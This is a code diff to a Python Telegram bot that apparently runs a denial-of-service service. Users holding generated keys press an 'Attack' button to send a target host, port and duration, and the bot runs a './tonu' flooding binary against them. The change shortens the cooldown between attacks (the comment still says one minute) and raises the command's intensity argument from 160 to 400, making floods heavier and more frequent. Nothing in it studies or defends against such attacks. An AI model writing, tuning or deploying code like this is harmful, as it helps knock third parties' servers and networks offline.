@@ -246,7 +246,7 @@ def process_genkey(call):
     key = create_random_key()
     bot.send_message(call.message.chat.id, f"✅ *Generated Key:* `{key}`\n⏳ Duration: {duration}", parse_mode="Markdown")
 
-COOLDOWN_PERIOD = 160  # 1-minute cooldown
+COOLDOWN_PERIOD = 100  # 1-minute cooldown
 @bot.message_handler(func=lambda message: message.text == "🚀 Attack")
 def handle_attack(message):
     user_id = str(message.chat.id)
@@ -297,7 +297,7 @@ def process_attack_details(message):
             else:
                 # Log the attack with correct variable name
                 log_command(user_id, target, port, attack_time)
-                full_command = f"./tonu {target} {port} {attack_time} 160"  # ✅ Correct variable name
+                full_command = f"./tonu {target} {port} {attack_time} 400"  # ✅ Correct variable name
 
                 username = message.chat.username or "No username"
 
